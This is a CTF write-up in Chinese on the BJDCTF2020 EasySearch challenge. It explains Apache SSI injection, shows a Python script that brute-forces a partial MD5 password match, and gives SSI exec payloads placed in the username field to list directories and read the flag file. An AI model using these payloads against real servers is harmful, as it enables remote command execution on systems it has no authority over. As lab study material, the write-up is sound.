# [BJDCTF2020]EasySearch Apache SSI漏洞

这道题有点意思 是SSI漏洞

照样 我们先熟悉SSI漏洞是什么

## SSI

服务端包含

```less
SSI 提供了对现有html增加动态的效果
 
是嵌入 html的指令 只有网页被调用了 才会执行
 
允许执行命令 所以会造成rce
```

## 使用条件

```less
当文件上传的时候 无法上传php
 
但是服务器开启了 SSI CGI支持
 
就可以通过 shtml文件上传
 
 
 Web 服务器已支持SSI（服务器端包含）
   
 
 Web 应用程序未对相关SSI关键字做过滤
    
 
 Web 应用程序在返回响应的HTML页面时，嵌入了用户输入
```

## 格式

```xml
<!--#exec cmd="ls /" -->
```

了解完了漏洞原理 我们开始做题

## 做题



<img src="https://i-blog.csdnimg.cn/blog_migrate/8e2548ff4aadc499849b49687d7bf816.png" alt="" style="max-height:356px; box-sizing:content-box;" />


打开网站 登入界面 我们会想到弱口令无果 sql注入 不存在注入点 robots.txt 不存在

于是我们看看是不是存在其他文件

我们使用dirsearch扫 无果 奇了怪了 完全不行啊

后面使用另一个工具才扫出来备份文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/a70a96c66a91c5b7eff9e5809d9b9854.png" alt="" style="max-height:66px; box-sizing:content-box;" />


```cobol
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

直接代码审计 这里其实就两块

### 第一部分

```cobol
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6))
```

通过MD5加密后的值需要前6位和admin变量中一样

直接python代码

```scss
import hashlib
 
for i in range(100000000):
    hashe=hashlib.md5(str(i).encode('utf-8')).hexdigest()
    if hashe[0:6]=="6d0bc1":
        print(i,hashe)
```

```cobol
2020666 6d0bc1153791aa2b4e18b4f344f26ab4
2305004 6d0bc1ec71a9b814677b85e3ac9c3d40
```

随便选一个 作为密码登入即可

### 第二部分

```php
 $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        }
```

创建一个 shtml后缀 对内容进行写入 内容是 username的内容 写入完成输出 header error

这里就是用上面的SSI 漏洞来做了

返回username

抓包 然后写入代码

```xml
<!--#exec cmd="ls /" -->
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/685d0c368560d6dfe87bb6867b17cd97.png" alt="" style="max-height:428px; box-sizing:content-box;" />


然后访问右边的路径



<img src="https://i-blog.csdnimg.cn/blog_migrate/f37bf74ab39f48a793d444e719291744.png" alt="" style="max-height:280px; box-sizing:content-box;" />


实现了rce

现在找flag就行了

```xml
<!--#exec cmd="ls ../" -->
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d321c36636ae1192b119fad7fb943181.png" alt="" style="max-height:320px; box-sizing:content-box;" />


```xml
<!--#exec cmd="cat ../f*" -->
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/003d245a0507eab16ec0f0e43d932da1.png" alt="" style="max-height:312px; box-sizing:content-box;" />


学到了学到了 SSI 漏洞